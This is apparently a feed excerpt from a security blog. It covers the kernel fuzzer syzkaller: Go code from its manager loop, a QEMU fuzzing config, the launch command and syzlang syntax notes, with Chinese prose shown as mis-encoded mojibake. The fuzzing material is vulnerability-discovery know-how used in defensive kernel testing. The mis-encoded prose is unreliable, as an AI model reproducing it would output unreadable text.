class="line">log.Logf(<span class="number">1</span>, <span class="string">&quot;loop: get repro from hub&quot;</span>)</span><br><span class="line">pendingRepro[crash] = <span class="literal">true</span></span><br><span class="line"><span class="keyword">case</span> reply := &lt;-mgr.needMoreRepros:</span><br><span class="line">reply &lt;- phase &gt;= phaseTriagedHub &amp;&amp;</span><br><span class="line"><span class="built_in">len</span>(reproQueue)+<span class="built_in">len</span>(pendingRepro)+<span class="built_in">len</span>(reproducing) == <span class="number">0</span></span><br><span class="line"><span class="keyword">goto</span> wait</span><br><span class="line"><span class="keyword">case</span> reply := &lt;-mgr.reproRequest:</span><br><span class="line">repros := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">bool</span>)</span><br><span class="line"><span class="keyword">for</span> title := <span class="keyword">range</span> reproducing &#123;</span><br><span class="line">repros[title] = <span class="literal">true</span></span><br><span class="line">&#125;</span><br><span class="line">reply &lt;- repros</span><br><span class="line"><span class="keyword">goto</span> wait</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿›å…¥æœ€åé˜¶æ®µï¼Œç­‰å¾…å¤„ç†ä¸åŒçš„<code>channel</code>æ•°æ®ï¼Œè¿™é‡Œé€<code>case</code>åˆ†æã€‚</p><p>é¦–å…ˆç¬¬ä¸€ä¸ªçš„è§¦å‘æ¡ä»¶ä¸º<code>instances.Freed</code>å³å½“ç©ºé—´çš„VMè¢«<code>Put</code>è¿”å›èµ„æºæ± æ—¶åˆ™ä¼šå‘è¯¥<code>channel</code>é€å…¥ä¸€ä¸ª<code>true</code>ï¼Œè¿›å…¥å…¶ä»£ç å—ï¼Œä½†æ˜¯å¹¶æ²¡åšä»€ä¹ˆäº‹æƒ…ã€‚</p><p>ç¬¬äºŒä¸ªçš„æ¡ä»¶å¯ä»¥æ³¨æ„åˆ°å‰é¢çš„èµ‹å€¼æ“ä½œ<code>stopRequest</code>å…¶å®å°±æ˜¯<code>mgr.vmStop</code>ï¼Œè€Œè¿™ä¸ª<code>channel</code>ä¼šåœ¨VM instanceçš„<code>RUN</code>å‡½æ•°ä¸­ä½¿ç”¨ã€‚</p><p>ç¬¬ä¸‰ä¸ªçš„æ¡ä»¶ä¸º<code>res := &lt;-runDone</code>å½“<code>runDone</code>ä¸­æœ‰æ•°æ®æ—¶è¿›å…¥ï¼Œå…¶æœ‰æ•°æ®ä»£è¡¨çš„æ˜¯æœ‰<code>crash</code>äº§ç”Ÿäº†ï¼Œè¿™é‡Œä¸»è¦åšçš„äº‹å°±æ˜¯å°†<code>crash</code>åŠ å…¥åˆ°<code>pendingRepro</code>ä¸­ã€‚</p><p>ç¬¬å››ä¸ªçš„æ¡ä»¶å°±æ˜¯å¤ç°æ—¶å‡ºç°ç»“æœï¼Œè¿™é‡Œä¸»è¦åšçš„äº‹æƒ…æ˜¯ï¼Œä»<code>reproducing</code>åˆ é™¤å¯¹åº”çš„<code>crash</code>ï¼Œéšåä¿å­˜å¤ç°ç»“æœã€‚</p><p>ç¬¬äº”ä¸ªæ¡ä»¶å°±æ˜¯å­˜åœ¨ç»ˆæ­¢ä¿¡å·ã€‚</p><p>ç¬¬å…­ä¸ªåˆ™æ˜¯<code>hubReproQueue</code>ä¹Ÿå¯èƒ½ä¼ æ¥<code>crash</code>ï¼Œå¦‚æœä¼ æ¥äº†<code>crash</code>åˆ™å°†å…¶åŠ å…¥åˆ°<code>pendingRepro</code>ä¸­ã€‚</p><p>ç¬¬ä¸ƒä¸ªæ ¹æ®<code>mgr.needMoreRepros</code>å­—é¢æ„æ€å°±æ˜¯éœ€è¦æ›´å¤šçš„<code>repros</code>ï¼Œå…¶å†…éƒ¨ä»£ç å°±æ˜¯åˆ¤æ–­å½“å‰é˜¶æ®µä»¥åŠç­‰å¾…å¤ç°ã€å¤ç°é˜Ÿåˆ—ã€å¤ç°ä¸­çš„æ•°é‡æ˜¯å¦ä¸º0å¹¶å°†æœ€åçš„ç»“æœè¿”å›åˆ°<code>channel</code>ä¸­å¹¶åœ¨æ­¤è¿è¡Œ<code>wait</code>é‡æ–°ç­‰å¾…ã€‚</p><p>æœ€å<code>mgr.reproRequest</code>æ„ä¸ºä¸»åŠ¨è¯·æ±‚å¤ç°ï¼Œè¿™é‡Œä¼šæ‹·è´<code>reproducing</code>çš„ä½å›¾å¹¶è¿”å›åˆ°<code>channel</code>ä¸­æœ€åè·³è½¬<code>wait</code>é‡æ–°ç­‰å¾…ã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h2&gt;&lt;p&gt;è¿™ç¯‡æ–‡ç« çš„å‰è¨€ä¸»è¦æä¸€ä¸‹å‰æ®µæ—¶é—´åœ¨å¼ºç½‘æ‹Ÿæ€ä¸­çš„pwnï¼Œé¦–å…ˆæ˜¯å†…æ ¸pwnã€‚&lt;/p&gt;
&lt;p&gt;å…¶å®å¾ˆç®€å•å°±æ˜¯ä¸€ä¸ªç®€å•ç‰ˆçš„&lt;code&gt;off by </summary>
      
    
    
    
    <category term="FUZZ" scheme="https://196082.github.io/categories/FUZZ/"/>
    
    
    <category term="FUZZ" scheme="https://196082.github.io/tags/FUZZ/"/>
    
    <category term="syzkaller" scheme="https://196082.github.io/tags/syzkaller/"/>
    
  </entry>
  
  <entry>
    <title>syzkalleråŸºæœ¬ä½¿ç”¨</title>
    <link href="https://196082.github.io/2023/11/10/syzkaller%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/"/>
    <id>https://196082.github.io/2023/11/10/syzkaller%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/</id>
    <published>2023-11-10T09:04:05.000Z</published>
    <updated>2023-11-29T10:13:25.396Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>è¿™ç¯‡æ–‡ç« åœ¨å‰é¢å·²ç»æ˜¯åŸ‹äº†è®¸å¤šå‘äº†ï¼Œé åçš„å‡ ç¯‡æ–‡ç« éƒ½æåˆ°äº†æˆ‘æƒ³å­¦<code>syzkaller</code>ï¼Œä½†æ˜¯æ€»æœ‰äº‹è€½æä»¥è‡³äºæ‹–åˆ°äº†ç°åœ¨ã€‚æœ¬æ¥æ²¡æœ‰æ‰“ç®—å°†åŸºæœ¬çš„ä½¿ç”¨æ–¹æ³•å†™æˆæ–‡ç« çš„ï¼Œä½†æ˜¯å°±æ˜¯å‰é¢çš„å‘è¿‡å¤šï¼Œå¦‚æœä¸å†™å‡ºæ¥çš„è¯å°±ä¼šè§‰å¾—å¿ƒé‡Œè†ˆåº”ã€‚è¿™ä¸€ç¯‡ä¸ä¼šæ¶‰åŠåˆ°<code>syzkaller</code>çš„å®ç°åŸç†ï¼Œåªèƒ½é»˜é»˜ç¥ˆç¥·ä¸ä¼šå¤ªæ°´ã€‚</p><p>ä¸€æ ·çš„ï¼Œè¿™é‡Œä¹Ÿå°±ä¸å¤šæå¦‚ä½•ç¼–è¯‘äº†ï¼Œç½‘ä¸Šçš„èµ„æ–™å¾ˆå¤šã€‚</p><h2 id="syzkallerä½¿ç”¨"><a href="#syzkallerä½¿ç”¨" class="headerlink" title="syzkallerä½¿ç”¨"></a>syzkallerä½¿ç”¨</h2><h3 id="å·¥ä½œåŸç†"><a href="#å·¥ä½œåŸç†" class="headerlink" title="å·¥ä½œåŸç†"></a>å·¥ä½œåŸç†</h3><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/LxNvdhpEX2sBjYc.png"                                     ></p><p>ç»å¸¸çœ‹æˆ‘æ–‡ç« çš„æœ‹å‹æˆ–è®¸çœ‹å‡ºæ¥äº†ï¼Œæˆ‘ä¸æ˜¯å¾ˆæ„¿æ„å°†å›¾ç‰‡ä¸Šåˆ°åšå®¢ï¼Œä¸»è¦åŸå› è¿˜æ˜¯æˆ‘æ²¡æœ‰ä½¿ç”¨å›¾åºŠæ‰€ä»¥å°½é‡å°‘çš„ä¸Šä¼ å›¾ç‰‡ï¼Œæ‰€ä»¥æˆ‘ä¸€èˆ¬æ”¾åˆ°åšå®¢çš„å›¾ç‰‡éƒ½æ˜¯è¾ƒä¸ºæœ‰ç”¨çš„å›¾ç‰‡ã€‚</p><p>è¿™é‡Œç®€å•æä¸€ä¸‹ä¸Šå›¾ï¼š</p><p>é¦–å…ˆ<code>syz-manager</code>ä½œä¸ºçš„æ˜¯<code>syzkallmer</code>çš„æ§åˆ¶ä¸­æ¢ï¼Œå…¶ä¼šå¯åŠ¨å¤šä¸ªvmå®ä¾‹ ( å›¾ä¸­ä¸€ä¸ªé»„è‰²å¡ç‰‡ä»£è¡¨ä¸€ä¸ªå®ä¾‹ ) å¹¶è¿›è¡Œç›‘è§†ï¼ŒåŒæ—¶é€šè¿‡<code>RPC</code>å¯åŠ¨<code>syz-fuzzer</code>ã€‚</p><p><code>syz-fuzzer</code>è´Ÿè´£å¼•å¯¼æ•´ä¸ªfuzzçš„è¿‡ç¨‹ã€‚ç¬¬ä¸€æ­¥ï¼Œç”Ÿæˆinputã€‚ç¬¬äºŒæ­¥ï¼Œå¯åŠ¨<code>syz-executor</code>è¿›ç¨‹è¿›è¡Œfuzzã€‚ç¬¬ä¸‰æ­¥ï¼Œä»è¢«fuzzçš„å†…æ ¸çš„<code>/sys/kernel/debug/kcov</code>è·å¾—è¦†ç›– ( coverage ) ç›¸å…³ä¿¡æ¯ã€‚æœ€åï¼Œé€šè¿‡<code>RPC</code>å°†æ–°çš„è¦†ç›–é€å›<code>syz-manager</code>ã€‚</p><p><code>syz-executor</code>è´Ÿè´£æ‰§è¡Œå•ä¸ªè¾“å…¥ã€‚</p><h3 id="é…ç½®æ–‡ä»¶"><a href="#é…ç½®æ–‡ä»¶" class="headerlink" title="é…ç½®æ–‡ä»¶"></a>é…ç½®æ–‡ä»¶</h3><p>åœ¨æ­£å¼ä½¿ç”¨å‰æˆ‘ä»¬éœ€è¦ä¸ºå…¶é¢å¤–ç¼–å†™é…ç½®æ–‡ä»¶</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;target&quot;</span>: <span class="string">&quot;linux/amd64&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;http&quot;</span>: <span class="string">&quot;127.0.0.1:56741&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;workdir&quot;</span>: <span class="string">&quot;/media/psf/pwn/fuzz01&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;kernel_obj&quot;</span>: <span class="string">&quot;/home/parallels/linux-5.11&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;image&quot;</span>: <span class="string">&quot;/media/psf/pwn/fuzz01/bullseye.img&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;sshkey&quot;</span>: <span class="string">&quot;/media/psf/pwn/fuzz01/bullseye.id_rsa&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;syzkaller&quot;</span>: <span class="string">&quot;/home/parallels/fuzz/gopath/syzkaller&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;procs&quot;</span>: <span class="number">8</span>,</span><br><span class="line">    <span class="attr">&quot;type&quot;</span>: <span class="string">&quot;qemu&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;vm&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;count&quot;</span>: <span class="number">4</span>,</span><br><span class="line">        <span class="attr">&quot;kernel&quot;</span>: <span class="string">&quot;/media/psf/pwn/fuzz01/bzImage&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;cpu&quot;</span>: <span class="number">2</span>,</span><br><span class="line">        <span class="attr">&quot;mem&quot;</span>: <span class="number">2048</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>$&#123;WORKDIR&#125;</code>æ˜¯éœ€è¦æ›¿æ¢ä¸ºæ‰€éœ€çš„å·¥ä½œç›®å½•ï¼Œä¹‹åç”Ÿæˆçš„crashæ–‡ä»¶å°†ä¼šä½äºå…¶ä¸­ã€‚<code>$&#123;LINUX&#125;</code>ä¸ºLinuxæºç ç›®å½•ã€‚<code>$&#123;IMAGE&#125;</code>ä¸ºæ–¹æ‰åˆ¶ä½œçš„ç³»ç»Ÿé•œåƒä¸å¯†é’¥æ–‡ä»¶ç›®å½•ã€‚<code>$&#123;GOPATH&#125;</code>æ›¿æ¢ä¸ºå®‰è£…Syzkalleræ‰€ä½¿ç”¨çš„GOPATHã€‚</p><h3 id="å¯åŠ¨syzkaller"><a href="#å¯åŠ¨syzkaller" class="headerlink" title="å¯åŠ¨syzkaller"></a>å¯åŠ¨syzkaller</h3><p>å¯åŠ¨å°±å¾ˆç®€å•äº†ï¼Œç›´æ¥è¾“å…¥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./bin/syz-manager -config=config.json <span class="comment"># config.jsonä¸ºå‰é¢æåˆ°çš„é…ç½®æ–‡ä»¶</span></span><br></pre></td></tr></table></figure><p>å¯åŠ¨æˆåŠŸåé€šè¿‡è®¿é—®<code>localhost:56741</code>å³å¯è·å–åˆ°<code>syzkaller</code>çš„çŠ¶æ€</p><h2 id="syzlangç¼–å†™æŒ‡å—"><a href="#syzlangç¼–å†™æŒ‡å—" class="headerlink" title="syzlangç¼–å†™æŒ‡å—"></a>syzlangç¼–å†™æŒ‡å—</h2><p>å¦‚æœåªæ˜¯ä¸Šè¿°æµç¨‹ä¸­é‚£æ ·ä¸€ç›´æŒ‚ç€å¯ä»¥å‡ºæ´çš„è¯ï¼Œå¤§å…¬å¸çš„æœåŠ¡å™¨å¯æ¯”æˆ‘è¿™ç”µè„‘å¥½å¾—ä¸çŸ¥é“å“ªå»äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦äººå·¥é…ç½®ç³»ç»Ÿè°ƒç”¨æ¨¡æ¿ï¼Œä»¥æœ‰é’ˆå¯¹æ€§çš„è¿›è¡Œæ¼æ´æŒ–æ˜ã€‚</p><p>syzkaller ä½¿ç”¨å®ƒè‡ªå·±çš„å£°æ˜å¼è¯­è¨€æ¥æè¿°ç³»ç»Ÿè°ƒç”¨æ¨¡æ¿ï¼Œåœ¨å®‰è£…ç›®å½•ä¸‹çš„ <code>docs/syscall_descriptions.md</code> ä¸ <code>docs/syscall_descriptions_syntax.md</code> ä¸­æœ‰ç€ç›¸å…³çš„è¯´æ˜ã€‚</p><p>æˆ‘ä»¬éœ€è¦ä½¿ç”¨ syzlang æ¥ç¼–å†™ç‰¹å®šçš„ç³»ç»Ÿè°ƒç”¨æè¿°æ–‡ä»¶ï¼ˆä¹Ÿå«è§„åˆ™æ–‡ä»¶ï¼‰ï¼Œsyzkaller ä¼šæ ¹æ®æˆ‘ä»¬çš„æè¿°æ–‡ä»¶æœ‰é’ˆå¯¹æ€§åœ°è¿›è¡Œ fuzzã€‚</p><h3 id="syzlangè¯­æ³•"><a href="#syzlangè¯­æ³•" class="headerlink" title="syzlangè¯­æ³•"></a>syzlangè¯­æ³•</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">syscallname <span class="string">&quot;(&quot;</span> [arg [<span class="string">&quot;,&quot;</span> arg]*] <span class="string">&quot;)&quot;</span> [type] [<span class="string">&quot;(&quot;</span> attribute* <span class="string">&quot;)&quot;</span>]</span><br><span class="line">arg = argname type</span><br><span class="line">argname = identifier</span><br><span class="line">type = <span class="keyword">typename</span> [ <span class="string">&quot;[&quot;</span> type-options <span class="string">&quot;]&quot;</span> ]</span><br><span class="line"><span class="keyword">typename</span> = <span class="string">&quot;const&quot;</span> | <span class="string">&quot;intN&quot;</span> | <span class="string">&quot;intptr&quot;</span> | <span class="string">&quot;flags&quot;</span> | <span class="string">&quot;array&quot;</span> | <span class="string">&quot;ptr&quot;</span> |</span><br><span class="line">   <span class="string">&quot;string&quot;</span> | <span class="string">&quot;strconst&quot;</span> | <span class="string">&quot;filename&quot;</span> | <span class="string">&quot;glob&quot;</span> | <span class="string">&quot;len&quot;</span> |</span><br><span class="line">   <span class="string">&quot;bytesize&quot;</span> | <span class="string">&quot;bytesizeN&quot;</span> | <span class="string">&quot;bitsize&quot;</span> | <span class="string">&quot;vma&quot;</span> | <span class="string">&quot;proc&quot;</span></span><br><span class="line">type-options = [type-opt [<span class="string">&quot;,&quot;</span> type-opt]]</span><br></pre></td></tr></table></figure><p>ä¸Šè¿°å³æ˜¯<code>syzlang</code>çš„è¯­æ³•ç»“æ„ï¼Œè¿™ç®€å•ä»‹ç»ä¸€ä¸‹ä¸Šé¢ç¬¦å·çš„å«ä¹‰ã€‚</p><blockquote><p><code>&quot;&quot;</code> è¡¨ç¤ºè¿™ä¸ªç¬¦å·å†…çš„å†…å®¹åº”æŒ‰ç…§å…¶åŸæ ·è¿›è¡ŒåŒ¹é…</p><p><code>|</code>   è¡¨ç¤ºçš„å«ä¹‰å¤§å·®ä¸å·®ï¼Œæ„å‘³å–å·¦å³ä¸¤è¾¹çš†å¯</p><p><code>=</code>   è¡¨ç¤ºå·¦è¾¹çš„è¡¨è¾¾å¼åº”ä¸ºå³è¾¹çš„å½¢å¼</p><p><code>[]</code> è¡¨ç¤ºå–å…¶å†…éƒ¨çš„ä¸€ä¸ªå€¼</p><p><code>*</code>   è¡¨ç¤ºå’Œæ­£åˆ™ä¸€æ ·ï¼Œå³ä¸º0ä¸ªæˆ–å¤šä¸ª</p></blockquote><p>æ‰€ä»¥å…¶å†™æ³•ä¸ºï¼Œ<code>syscallname</code> + å¤šä¸ª<code>arg</code>ç»„æˆã€‚<code>arg</code>ç”±æ ‡è¯†ç¬¦<code>identifier</code>ä¸æ“ä½œç±»å‹<code>type</code>æ„æˆã€‚<code>type</code>ç”±æ“ä½œç±»å‹å<code>typename</code>ä»¥åŠå¯¹åº”ç±»å‹çš„ç±»å‹é€‰æ‹©<code>type-options</code>ç»„æˆï¼Œæœ€åæ ¹æ®<code>typename</code>çš„ä¸åŒï¼Œ<code>type-options</code>è·Ÿä¸€ä¸ªæˆ–ä¸¤ä¸ª<code>type-opt</code>ã€‚</p><p>æ ¹æ®ä¸Šè¿°è§„åˆ™å¯ä»¥å¾ˆè½»æ¾çš„ç†è§£Googleå®˜æ–¹æä¾›çš„ä¸€ä¸ªæ¨¡æ¿</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">open(file filename, flags flags[open_flags], mode flags[open_mode]) <span class="function">fd</span></span><br><span class="line"><span class="function"><span class="title">read</span><span class="params">(fd fd, buf buffer[out], count len[buf])</span></span></span><br><span class="line"><span class="function"><span class="title">close</span><span class="params">(fd fd)</span></span></span><br><span class="line"><span class="function">open_mode </span>= S_IRUSR, S_IWUSR, S_IXUSR, S_IRGRP, S_IWGRP, S_IXGRP, S_IROTH, S_IWOTH, S_IXOTH</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæ³¨é‡Šçš„å†™æ³•å°±å’Œ<code>python</code>ä¸€æ ·</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># aaaa</span></span><br></pre></td></tr></table></figure><p>æ–‡ä»¶åŒ…å«çš„å†™æ³•åŸºæœ¬å°±å’ŒCä¸€æ ·</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include&lt;linux/fs.h&gt;</span><br></pre></td></tr></table></figure><h3 id="å‚æ•°"><a href="#å‚æ•°" class="headerlink" title="å‚æ•°"></a>å‚æ•°</h3><p>å‰é¢ä¸­æåˆ°äº†å‚æ•°çš„å½¢å¼</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arg = argname + type</span><br></pre></td></tr></table></figure><p>å…¶æœ‰ä¸€ä¸ªå‚æ•°ååŠ ä¸€ä¸ªæ“ä½œç±»å‹æ„æˆã€‚ä¸‹é¢æ ¹æ®ä¾‹å­è¯¦ç»†è®²ä¸€ä¸‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL_DEFINE3(read, <span class="keyword">unsigned</span> <span class="keyword">int</span>, fd, <span class="keyword">char</span> __user *, buf, <span class="keyword">size_t</span>, count)</span><br></pre></td></tr></table></figure><p>ä¸Šè¿°æ˜¯å†…æ ¸ä¸­readç³»ç»Ÿè°ƒç”¨çš„å£°æ˜ï¼Œå½“æˆ‘ä»¬ä½¿ç”¨ libc çš„ wrapper è¿›è¡Œ read ç³»ç»Ÿè°ƒç”¨æ—¶ï¼Œå½¢å¼å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> my_file_fd = open(<span class="string">&quot;/dev/test&quot;</span>, O_RDONLY);</span><br><span class="line"><span class="keyword">char</span> my_buf[<span class="number">114514</span>];</span><br><span class="line"><span class="keyword">size_t</span>my_count = <span class="number">114514</span>;</span><br><span class="line">read(my_file_fd, my_buf, my_count);</span><br></pre></td></tr></table></figure><p>åœ¨ä¸Šè¿°ä¾‹å­ä¸­<code>fdã€bufã€count</code>å³ä¸º<code>argname</code>ï¼Œ<code>my_file_fdã€my_bufã€my_count</code>å³ä¸º<code>type</code></p><p>é‚£ä¹ˆåœ¨<code>syzlang</code>ç¼–å†™ç³»ç»Ÿè°ƒç”¨æ—¶å°±åº”è¯¥å†™ä¸º<code>fd my_file_fd</code>ã€‚( è¿™é‡Œå‡è®¾<code>my_file_fd</code>å·²å®šä¹‰ä¸º<code>resources</code> )</p><h3 id="ç±»å‹"><a href="#ç±»å‹" class="headerlink" title="ç±»å‹"></a>ç±»å‹</h3><p>å‰é¢æåˆ°äº†<code>arg</code>æ˜¯ç”±<code>argname type</code>æ„æˆï¼Œä¹Ÿæåˆ°äº†<code>type</code>æ˜¯ç”±<code>typename type-options</code>æ„æˆã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type = <span class="keyword">typename</span> [ <span class="string">&quot;[&quot;</span> type-options <span class="string">&quot;]&quot;</span> ]</span><br></pre></td></tr></table></figure><p>é¦–å…ˆè¿™é‡Œè¯¦ç»†æä¸€ä¸‹ç±»å‹åï¼Œå³è¯¥ type çš„ç±»å‹ï¼Œä¾‹å¦‚ C å½“ä¸­çš„intã€charã€void ç­‰ç­‰ã€‚</p><p>å¸¸è§„çš„ç±»å‹ååŒ…æ‹¬ï¼š( <del>ç›´æ¥æ¬ï¼</del>)</p><ul><li>  <strong>opt</strong>ï¼šè¿™æ˜¯ä¸€ä¸ªå¯é€‰å‚æ•°ï¼ˆä¾‹å¦‚ mmap çš„ fdï¼‰</li></ul><p>å…¶ä½™ type-options æ˜¯åŸºäºç‰¹å®š type çš„ï¼Œå¦‚ä¸‹ï¼š</p><ul><li><strong>const</strong>ï¼šæ•´å‹å¸¸æ•°<ul><li>ç±»å‹é€‰é¡¹ï¼š<ul><li>  å€¼ï¼ˆvalueï¼‰ï¼šä¾‹å¦‚ <code>0</code></li><li>  åŸºç¡€ç±»å‹ï¼ˆunderlying typeï¼‰ï¼š<code>intN</code> æˆ– <code>intptr</code> ä¹‹ä¸€</li></ul></li></ul></li><li><strong>intN</strong> æˆ– <strong>intptr</strong>ï¼šä¸€ä¸ªæœ‰ç€ç‰¹æ®Šå«ä¹‰çš„æ•´å‹ï¼Œä¸‹æ–‡ä¼šè¿›è¡Œè¯¦ç»†è¯´æ˜<ul><li>ç±»å‹é€‰é¡¹ï¼š<ul><li>  å¯é€‰èŒƒå›´åŒºé—´ï¼šä¾‹å¦‚ <code>&quot;1:100&quot;</code> è¡¨ç¤ºå–å€¼å€¼çš„åŒºé—´ä¸º <code>[1, 100]</code></li><li>  å¯é€‰å‚æ•°</li></ul></li></ul></li><li><strong>flags</strong>ï¼šå€¼çš„é›†åˆ<ul><li>ç±»å‹é€‰é¡¹ï¼š<ul><li>  å¯¹ flags æè¿°çš„å¼•ç”¨</li><li>  åŸºç¡€æ•´å‹ç±»å‹ï¼šä¾‹å¦‚ <code>int32</code></li></ul></li></ul></li><li><strong>array</strong>ï¼šä¸€ä¸ªå¯å˜é•¿/å›ºå®šé•¿åº¦çš„æ•°ç»„<ul><li>ç±»å‹é€‰é¡¹ï¼š<ul><li>  å…ƒç´ çš„ type</li><li>  å¯é€‰é•¿åº¦åŒºé—´ï¼šä¾‹å¦‚å›ºå®šé•¿åº¦ <code>&quot;5&quot;</code> æˆ–è€…é•¿åº¦èŒƒå›´ <code>&quot;5:10&quot;</code>ï¼ˆåŒ…æ‹¬è¾¹ç•Œï¼‰</li></ul></li></ul></li><li><strong>ptr</strong> æˆ– <strong>ptr64</strong>ï¼šæŒ‡å‘ä¸€ä¸ªå¯¹è±¡çš„æŒ‡é’ˆ<ul><li>ç±»å‹é€‰é¡¹ï¼š<ul><li>  æ–¹å‘ï¼š<code>in</code> æˆ– <code>out</code> æˆ– <code>inout</code></li><li>  å¯¹è±¡çš„ type</li></ul></li><li>  æ— è®ºå¯¹è±¡æŒ‡é’ˆå¤§å°å¦‚ä½•ï¼Œptr64 æ°¸è¿œä¸º 8 å­—èŠ‚</li></ul></li><li><strong>string</strong>ï¼šä¸€å—æœ‰ç€ 0 ç»ˆæ­¢ç¬¦çš„å†…å­˜ç¼“å†²åŒº<ul><li>ç±»å‹é€‰é¡¹ï¼š<ul><li>å¸¸é‡å­—ç¬¦ä¸²/å¯¹å­—ç¬¦ä¸²çš„å¼•ç”¨<ul><li>  å‰è€…ï¼šä¾‹å¦‚ <code>&quot;foo&quot;</code>ä½œä¸ºå¸¸è§„å­—ç¬¦ä¸²è¿›è¡Œè§£æï¼Œæˆ–è€…<code>deadbeef</code>ä½œä¸º4ä¸ª 16 è¿›åˆ¶å­—èŠ‚è¿›è¡Œè§£æ</li><li>  åè€…ï¼šè‹¥æ˜¯ç‰¹æ®Šç±»å‹ <code>filename</code> åˆ™ä¼š<strong>ç”Ÿæˆ</strong>æ–‡ä»¶å</li></ul></li></ul></li></ul></li><li><strong>stringnoz</strong>ï¼šä¸€å—<strong>æ²¡æœ‰</strong> 0 ç»ˆæ­¢ç¬¦çš„å†…å­˜ç¼“å†²åŒº<ul><li>  ç±»å‹é€‰é¡¹ï¼šï¼ˆåŒ <code>string</code>)</li></ul></li><li><strong>glob</strong>ï¼šåŒ¹é…ç›®æ ‡æ–‡ä»¶çš„ globï¼ˆï¼Ÿï¼‰æ¨¡å¼<ul><li>ç±»å‹é€‰é¡¹ï¼š<ul><li>  ç”¨å¼•å·åŒ…è£¹ç€çš„æ¨¡å¼å­—ç¬¦ä¸²ï¼šä¾‹å¦‚ <code>&quot;/sys/&quot;</code> æˆ– <code>&quot;/sys/**/*/&quot;</code>ï¼Œå…·ä½“ç”¨æ³•å‚è§<a class="link"   href="https://pkg.go.dev/path/filepath#Match" >https://pkg.go.dev/path/filepath#Match<i class="fas fa-external-link-alt"></i></a></li></ul></li></ul></li><li><strong>fmt</strong>ï¼šä¸€ä¸ªè¡¨ç¤ºä¸€ä¸ªæ•´æ•°çš„å­—ç¬¦ä¸²<ul><li>ç±»å‹é€‰é¡¹ï¼š<ul><li>  æ ¼å¼ä¸å€¼ï¼šå‰è€…å¯å–å€¼ä¸º <code>dec</code>æˆ– <code>hex</code> æˆ– <code>oct</code>ï¼›åè€…å¯ä»¥æ˜¯ä¸€ä¸ª resourceã€intã€flagsã€const æˆ– proc</li></ul></li><li>  æœ€ç»ˆçš„ç»“æœé€šå¸¸æ˜¯å›ºå®šå°ºå¯¸çš„</li></ul></li><li><strong>len</strong>ï¼šå¦ä¸€ä¸ª <code>å­—æ®µ</code> çš„é•¿åº¦ï¼ˆå¯¹äº array è€Œè¨€ä¸ºå…ƒç´ çš„æ•°é‡ï¼‰<ul><li>ç±»å‹é€‰é¡¹ï¼š<ul><li>  å¯¹è±¡çš„ argname</li></ul></li></ul></li><li><strong>bytesize</strong>ï¼šä¸ len ç±»ä¼¼ï¼Œä¸è¿‡å•ä½æ˜¯<strong>å­—èŠ‚</strong><ul><li>ç±»å‹é€‰é¡¹ï¼š<ul><li>  å¯¹è±¡çš„ argname</li></ul></li></ul></li><li><strong>bitsize</strong>ï¼šä¸ len ç±»å‹ï¼Œä¸è¿‡å•ä½æ˜¯<strong>æ¯”ç‰¹ä½</strong><ul><li>ç±»å‹é€‰é¡¹ï¼š<ul><li>  å¯¹è±¡çš„ argname</li></ul></li></ul></li><li><strong>offsetof</strong>ï¼šä¸€ä¸ª 